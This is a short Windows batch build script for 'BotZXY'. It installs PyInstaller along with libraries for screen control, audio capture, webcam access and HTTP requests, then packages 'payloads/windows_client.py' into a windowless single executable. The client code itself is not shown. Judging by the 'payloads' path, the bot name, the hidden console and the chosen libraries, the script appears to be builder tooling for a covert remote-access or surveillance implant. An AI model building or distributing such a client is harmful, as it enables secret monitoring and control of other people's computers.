@echo off
echo ========================================
echo   BotZXY - Windows Client Builder (Python 3.11)
echo ========================================

echo.
echo [1] Installing PyInstaller...
py -3.11 -m pip install pyinstaller

echo.
echo [2] Installing dependencies...
py -3.11 -m pip install pyautogui pyaudio opencv-python pillow pywin32 requests

echo.
echo [3] Building executable...
py -3.11 -m PyInstaller --onefile --noconsole --name botzxy_client payloads/windows_client.py

echo.
echo ========================================
echo   Build complete!
echo   File: dist\botzxy_client.exe
echo ========================================
pause